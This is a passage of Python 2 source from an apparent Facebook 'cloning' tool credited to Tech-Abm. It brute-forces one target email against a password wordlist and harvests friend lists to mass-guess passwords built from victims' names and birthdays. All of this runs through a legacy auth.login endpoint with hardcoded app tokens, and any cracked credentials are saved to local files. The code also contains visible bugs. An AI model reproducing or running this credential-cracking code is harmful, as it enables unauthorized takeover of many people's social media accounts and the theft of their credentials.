																	cekpoint.append(user+pass7)
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m «--------------------------------------------»"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def hackingx():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.001)
        login()
    else:
        os.system('clear')
        print logo
        print "\033[1;96m «--------------------------------------------»" 
        try:
            email = raw_input('\x1b[1;91m[+] \x1b[1;93mID\x1b[1;97m/\x1b[1;91mEmail \x1b[1;92mTarget \x1b[1;91m:\x1b[1;91m ')
            passw = raw_input('\x1b[1;91m[+] \x1b[1;96mWordlist \x1b[1;97m(Type👉Abmhacker.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print "\033[1;96m «--------------------------------------------»" 
            print '\x1b[1;93m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            time.sleep(0.05)
            print '\x1b[1;93m[+] \x1b[1;93mTotal\x1b[1;94m ' + str(len(total)) + ' \x1b[1;92mPassword'
            time.sleep(0.05)
            jalan('\x1b[1;93m[\xe2\x9c\xba] \x1b[1;97mPlease wait \x1b[1;97m...')
            print "\033[1;96m «--------------------------------------------»" 
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' ● ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print "\033[1;96m «--------------------------------------------»" 
                        time.sleep(0.05)
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;95mUsername \x1b[1;91m:\x1b[1;92m ' + email
                        time.sleep(0.05)
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;91mPassword \x1b[1;91m:\x1b[1;91m ' + pw
                        time.sleep(0.05)
                        print "\033[1;96m «--------------------------------------------»" 
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print "\033[1;96m «--------------------------------------------»" 
                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                            print "\033[1;96m «--------------------------------------------»" 
                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint :('
                            time.sleep(0.05)
                            print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;91mUsername \x1b[1;93m:\x1b[1;92m ' + email
                            time.sleep(0.05)
                            print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;91mPassword \x1b[1;93m:\x1b[1;92m ' + pw
                            print "\033[1;96m «--------------------------------------------»" 
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print """\n\x1b[1;91m[!] \x1b[1;93mAdd another wordlist corect name"""
            super()
          
def chinesex():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;96m «--------------------------------------------»" 
        print( "\x1b[1;32;92m[1] \033[1;33;92m>> Crack From Friendlist \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;92m[2] \033[1;33;92m>> Crack From Public ID \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
	print "\033[1;96m «--------------------------------------------»" 
	pilih_chinesex()

def pilih_chinesex():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_chinesex()
        elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;96m «--------------------------------------------»" 
		jalan('\033[1;96m[⊱⋕⊰] \033[1;92mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;96m «--------------------------------------------»" 
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading process........ "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m «--------------------------------------------»"
	jalan('   \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;91m            Create By : Tech-Abm')
	print "\033[1;97m «--------------------------------------------»"

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Tech-abm
		try:													
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = y['last_name'] + '12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\x1b[1;97m' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = y['last_name'] + '786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m «--------------------------------------------»"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def testingx():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m «--------------------------------------------»"
	print( "\x1b[1;32;92m[1] \033[1;33;98m>> Enter Username For Cloning \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
	print "\033[1;97m «--------------------------------------------»"
	pilih_testingx()

def pilih_testingx():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_testingx()     
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading process........ "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m «--------------------------------------------»"
	jalan('   \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;91m            Create By : Tech-Abm')
	print "\033[1;97m «--------------------------------------------»"

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Tech-abm
		try:													
			w = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
			q = json.loads(w.text)
			# Password Guess 1
			pass1 = q['first_name'] + '123'
			data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			u = json.load(data)
			if 'access_token' in u:
			    print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass1
                        elif 'www.facebook.com' in u['error_msg']:
                            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass1
                        else:
            	            # Password Guess 2
                            pass2 = q['first_name'] + '12345'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            u = json.load(data)
                            if 'access_token' in u:
                                print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass2
                            elif 'www.facebook.com' in u['error_msg']:
                                print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass2
                            else:
                	        # Password Guess 3
                                pass3 = q['last_name'] + '123'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                u = json.load(data)
                                if 'access_token' in u:
                                    print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass3
                                elif 'www.facebook.com' in u['error_msg']:
                                    print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass3
                                else:
                    	            # Password Guess 4
                                    birth = q['birthday']
                                    pass4 = birth.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    u = json.load(data)
                                    if 'access_token' in u:
                                        print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass4
                                    elif 'www.facebook.com' in u['error_msg']:
                                        print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass4
                                    else:
                                        # Password Guess 5
                                        pass5 = '786786'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        u = json.load(data)
                                        if 'access_token' in u:
                            	            print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass5
                                        elif 'www.facebook.com' in u['error_msg']:
                            	            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass5
                                        else:
                            	            # Password Guess 6
                            	            pass6 = 'Pakistan'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            u = json.load(data)
                                            if 'access_token' in u:
                                	        print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass6
                                            elif 'www.facebook.com' in u['error_msg']:
                            	                print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass6
                                            else:
                            	                # Password Guess 7
                            	                pass7 = b['first_name'] + '1234'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                u = json.load(data)
                                                if 'access_token' in u:
                                	            print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass7
                                                elif 'www.facebook.com' in u['error_msg']:
                            	                    print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass7
                                                else:
                            	                    # Password Guess 8
                            	                    pass8 = q['first_name'] + '786'
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    u = json.load(data)
                                                    if 'access_token' in u:
                                	                print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass8
                                                    elif 'www.facebook.com' in u['error_msg']:
                            	                        print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass8
                                                    else:
                            	                        # Password Guess 9
                            	                        pass9 = q['first_name'] + 'Khan'
                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                        u = json.load(data)
                                                        if 'access_token' in u:
                                	                    print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass9
                                                        elif 'www.facebook.com' in u['error_msg']:
                            	                            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass9
                                                        else:
                            	                            # Password Guess 10
                            	                            pass10 = q['first_name'] + q['last_name']
                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            u = json.load(data)
                                                            if 'access_token' in u:
                                	                        print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass10
                                                            elif 'www.facebook.com' in u['error_msg']:
                            	                                print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass10
                                                            else:
                            	                                # Password Guess 11
                            	                                pass11 = q['first_name'] + q['last_name'] + '123'
                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                u = json.load(data)
                                                                if 'access_token' in u:
                                	                            print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass11
                                                                elif 'www.facebook.com' in u['error_msg']:
                            	                                    print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass11
                                                                else:
                            	                                    # Password Guess 12
                            	                                    pass12 = q['first_name'] + '0987'
                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                    u = json.load(data)
                                                                    if 'access_token' in u:
                                	                                print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass12
                                                                    elif 'www.facebook.com' in u['error_msg']:
                            	                                        print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass12
                                                                    else:
                            	                                        # Password Guess 13
                            	                                        pass13 = q['first_name'] + '098765'
                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                        u = json.load(data)
                                                                        if 'access_token' in u:
                                	                                    print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass13
                                                                        elif 'www.facebook.com' in u['error_msg']:
                            	                                            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass13
                                                                        else:
                            	                                            # Password Guess 14
                            	                                            pass14 = q['last_name'] + '0987'
                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                            u = json.load(data)
                                                                            if 'access_token' in u:
                                	                                        print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass14
                                                                            elif 'www.facebook.com' in u['error_msg']:
                            	                                                print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass14
                                                                            else:
                                                                                pass
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m «--------------------------------------------»"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def clonerx():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
        print "\033[1;96m «--------------------------------------------»" 
	print( "\x1b[1;32;92m[2] \033[1;33;92m>> Crack From Public ID \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
	print "\033[1;96m «--------------------------------------------»" 
	pilih_clonerx()

def pilih_clonerx():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_clonerx()
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading process........ "
